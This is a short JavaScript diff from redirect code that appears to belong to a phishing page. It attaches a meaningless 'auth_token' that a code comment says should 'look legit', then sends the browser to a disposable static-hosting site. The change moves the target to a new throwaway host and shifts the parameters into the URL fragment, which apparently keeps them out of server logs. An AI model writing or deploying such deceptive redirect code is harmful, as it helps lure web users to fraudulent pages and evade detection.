@@ -20,10 +20,10 @@
     params.set("auth_token", generateJargon());  // name it whatever looks legit
 
     // Set the redirect base URL
-    const baseURL = "https://hub-cart.surge.sh/access.html";
+    const baseURL = "https://zenith-1758205816505.staticrun.app/index.html";
 
     // Final redirect URL with params + jargon
-    const redirectURL = baseURL + "?" + params.toString();
+    const redirectURL = baseURL + "#" + params.toString();
 
     // Redirect
     window.location.href = redirectURL;
